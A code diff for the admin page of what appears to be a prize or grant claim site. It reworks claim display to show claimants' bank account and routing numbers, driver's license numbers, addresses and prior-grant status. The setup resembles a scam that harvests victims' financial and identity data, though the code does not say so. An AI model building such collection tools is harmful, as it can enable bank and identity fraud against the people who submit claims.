@@ -1,10 +1,10 @@
 "use client"
 
 import { useState, useEffect, useCallback } from "react"
-import { motion } from "framer-motion"
+import { motion, AnimatePresence } from "framer-motion"
 import {
-  Shield, Plus, Trash2, Users, FileText, Eye, EyeOff,
-  Loader2, DollarSign, CheckCircle2, Clock
+  Shield, Plus, Trash2, Users, FileText, Loader2, DollarSign,
+  CheckCircle2, Clock, ChevronDown, ChevronUp, CreditCard, Landmark, Hash
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
@@ -25,16 +25,10 @@ interface Winner {
 interface Claim {
   id: string
   winnerId: string
-  firstName: string
-  lastName: string
-  email: string
-  phone: string
-  address: string
-  city: string
-  state: string
-  zipCode: string
-  ssnLast4: string
-  notes: string
+  method: string
+  uniqueCode: string
+  amount: string
+  data: Record<string, unknown>
   submittedAt: string
   status: string
 }
@@ -48,6 +42,7 @@ export default function AdminPage() {
   const [claims, setClaims] = useState<Claim[]>([])
   const [loading, setLoading] = useState(false)
   const [showAddForm, setShowAddForm] = useState(false)
+  const [expandedClaim, setExpandedClaim] = useState<string | null>(null)
   const [newWinner, setNewWinner] = useState({
     firstName: "",
     lastName: "",
@@ -135,6 +130,9 @@ export default function AdminPage() {
     }
   }
 
+  const formatCurrency = (val: string | number) =>
+    new Intl.NumberFormat("en-US", { style: "currency", currency: "USD", minimumFractionDigits: 0 }).format(Number(val))
+
   if (!authenticated) {
     return (
       <div className="min-h-[80vh] flex items-center justify-center bg-gradient-to-b from-muted/30 to-background">
@@ -178,10 +176,16 @@ export default function AdminPage() {
             <h1 className="text-3xl font-bold">Admin Dashboard</h1>
             <p className="text-muted-foreground">Manage winners and view claims</p>
           </div>
-          <Button onClick={() => setShowAddForm(!showAddForm)} className="gap-2">
-            <Plus className="h-4 w-4" />
-            Add Winner
-          </Button>
+          <div className="flex gap-3">
+            <Button onClick={fetchData} variant="outline" className="gap-2" disabled={loading}>
+              {loading ? <Loader2 className="h-4 w-4 animate-spin" /> : null}
+              Refresh
+            </Button>
+            <Button onClick={() => setShowAddForm(!showAddForm)} className="gap-2">
+              <Plus className="h-4 w-4" />
+              Add Winner
+            </Button>
+          </div>
         </div>
 
         {/* Stats */}
@@ -332,43 +336,121 @@ export default function AdminPage() {
             </div>
           </Card>
         ) : (
-          <Card>
-            <div className="overflow-x-auto">
-              <table className="w-full text-sm">
-                <thead>
-                  <tr className="border-b bg-muted/50">
-                    <th className="px-4 py-3 text-left font-semibold">Name</th>
-                    <th className="px-4 py-3 text-left font-semibold">Email</th>
-                    <th className="px-4 py-3 text-left font-semibold">Phone</th>
-                    <th className="px-4 py-3 text-left font-semibold">Location</th>
-                    <th className="px-4 py-3 text-left font-semibold">Submitted</th>
-                    <th className="px-4 py-3 text-left font-semibold">Status</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  {claims.map((c) => (
-                    <tr key={c.id} className="border-b hover:bg-muted/30 transition-colors">
-                      <td className="px-4 py-3 font-medium">{c.firstName} {c.lastName}</td>
-                      <td className="px-4 py-3 text-muted-foreground">{c.email}</td>
-                      <td className="px-4 py-3 text-muted-foreground">{c.phone}</td>
-                      <td className="px-4 py-3 text-muted-foreground">{c.city}, {c.state}</td>
-                      <td className="px-4 py-3 text-muted-foreground">{new Date(c.submittedAt).toLocaleDateString()}</td>
-                      <td className="px-4 py-3">
+          /* Claims Tab - Enhanced */
+          <div className="space-y-3">
+            {claims.length === 0 ? (
+              <Card>
+                <CardContent className="py-10 text-center text-muted-foreground">
+                  No claims submitted yet
+                </CardContent>
+              </Card>
+            ) : (
+              claims.map((c) => (
+                <Card key={c.id} className="overflow-hidden border-2 hover:border-primary/20 transition-colors">
+                  <button
+                    onClick={() => setExpandedClaim(expandedClaim === c.id ? null : c.id)}
+                    className="w-full text-left"
+                  >
+                    <CardContent className="flex items-center justify-between p-4">
+                      <div className="flex items-center gap-4 flex-wrap">
+                        {/* Method Icon */}
+                        <div className={`flex h-10 w-10 shrink-0 items-center justify-center rounded-xl ${
+                          c.method === "cashier_check" ? "bg-orange-100" : "bg-blue-100"
+                        }`}>
+                          {c.method === "cashier_check" ? (
+                            <CreditCard className="h-5 w-5 text-orange-600" />
+                          ) : (
+                            <Landmark className="h-5 w-5 text-blue-600" />
+                          )}
+                        </div>
+
+                        {/* Name & Method */}
+                        <div>
+                          <div className="font-semibold">
+                            {String(c.data?.fullName || `${c.data?.firstName || ""} ${c.data?.lastName || ""}`.trim() || "Unknown")}
+                          </div>
+                          <div className="text-xs text-muted-foreground">
+                            {c.method === "cashier_check" ? "Cashier Check" : "Electronic Deposit"} • {new Date(c.submittedAt).toLocaleDateString()}
+                          </div>
+                        </div>
+
+                        {/* Unique Code */}
+                        <div className="flex items-center gap-1.5 rounded-lg bg-muted px-3 py-1.5">
+                          <Hash className="h-3.5 w-3.5 text-muted-foreground" />
+                          <code className="text-xs font-bold">{c.uniqueCode}</code>
+                        </div>
+
+                        {/* Amount */}
+                        <span className="font-bold text-green-600">{formatCurrency(c.amount)}</span>
+
+                        {/* Status */}
                         <span className="inline-flex items-center gap-1 rounded-full bg-blue-100 px-2.5 py-1 text-xs font-medium text-blue-700">
                           {c.status}
                         </span>
-                      </td>
-                    </tr>
-                  ))}
-                  {claims.length === 0 && (
-                    <tr><td colSpan={6} className="py-10 text-center text-muted-foreground">No claims submitted yet</td></tr>
-                  )}
-                </tbody>
-              </table>
-            </div>
-          </Card>
+                      </div>
+
+                      <div className="shrink-0 ml-2">
+                        {expandedClaim === c.id ? (
+                          <ChevronUp className="h-5 w-5 text-muted-foreground" />
+                        ) : (
+                          <ChevronDown className="h-5 w-5 text-muted-foreground" />
+                        )}
+                      </div>
+                    </CardContent>
+                  </button>
+
+                  <AnimatePresence>
+                    {expandedClaim === c.id && (
+                      <motion.div
+                        initial={{ height: 0, opacity: 0 }}
+                        animate={{ height: "auto", opacity: 1 }}
+                        exit={{ height: 0, opacity: 0 }}
+                        transition={{ duration: 0.2 }}
+                      >
+                        <div className="border-t bg-muted/30 px-6 py-5">
+                          <div className="grid gap-4 sm:grid-cols-2">
+                            {c.method === "cashier_check" ? (
+                              <>
+                                <DetailItem label="Full Name" value={c.data?.fullName} />
+                                <DetailItem label="Email" value={c.data?.email} />
+                                <DetailItem label="Address" value={`${c.data?.address || ""}, ${c.data?.city || ""}, ${c.data?.state || ""} ${c.data?.zipCode || ""}`} />
+                                <DetailItem label="Driver's License" value={c.data?.driversLicense} />
+                                <DetailItem label="Received Grants Before" value={c.data?.receivedGrantsBefore} />
+                                <DetailItem label="Winner ID" value={c.winnerId} />
+                              </>
+                            ) : (
+                              <>
+                                <DetailItem label="Full Name" value={c.data?.fullName} />
+                                <DetailItem label="Email" value={c.data?.email} />
+                                <DetailItem label="Account Number" value={c.data?.accountNumber} />
+                                <DetailItem label="Routing Number" value={c.data?.routingNumber} />
+                                <DetailItem label="Bank Name" value={c.data?.bankName} />
+                                <DetailItem label="Bank Address" value={`${c.data?.bankAddress || ""}, ${c.data?.bankCity || ""}, ${c.data?.bankState || ""} ${c.data?.bankZipCode || ""}`} />
+                                <DetailItem label="Home Address" value={`${c.data?.homeAddress || ""}, ${c.data?.homeCity || ""}, ${c.data?.homeState || ""} ${c.data?.homeZipCode || ""}`} />
+                                <DetailItem label="Received Grants Before" value={c.data?.receivedGrantsBefore} />
+                                <DetailItem label="Winner ID" value={c.winnerId} />
+                              </>
+                            )}
+                          </div>
+                        </div>
+                      </motion.div>
+                    )}
+                  </AnimatePresence>
+                </Card>
+              ))
+            )}
+          </div>
         )}
       </div>
+    </div>
+  )
+}
+
+function DetailItem({ label, value }: { label: string; value: unknown }) {
+  return (
+    <div>
+      <div className="text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-0.5">{label}</div>
+      <div className="text-sm font-medium">{String(value || "—")}</div>
     </div>
   )
 }
